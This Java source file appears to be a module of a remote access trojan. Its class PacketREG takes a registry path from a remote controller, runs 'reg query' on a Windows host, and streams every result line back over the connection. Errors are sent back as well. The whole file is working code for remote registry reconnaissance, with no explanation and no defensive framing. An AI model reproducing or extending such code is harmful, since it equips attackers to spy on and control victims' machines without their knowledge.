package com.redpois0n.packets;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import com.redpois0n.Connection;
import com.redpois0n.common.os.OperatingSystem;


public class PacketREG extends Packet {

	@Override
	public void read(String line) throws Exception {
		String path = Connection.readLine();
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				Process p = Runtime.getRuntime().exec(new String[] { "reg", "query", path });

				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
				while ((line = reader.readLine()) != null) {
					String[] args = line.trim().split("    ");
					PacketBuilder packet = new PacketBuilder(Header.REGISTRY);
					
					packet.add(args.length);
					
					for (String str : args) {
						packet.add(str);
					}
					Connection.addToSendQueue(packet);
				}
				reader.close();
			} else {
				throw new Exception("Windows only");
			}
		} catch (Exception ex) {
			Connection.addToSendQueue(new PacketBuilder(Header.REGISTRY, new String[] { "1", "Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage() }));
		}
	}

}
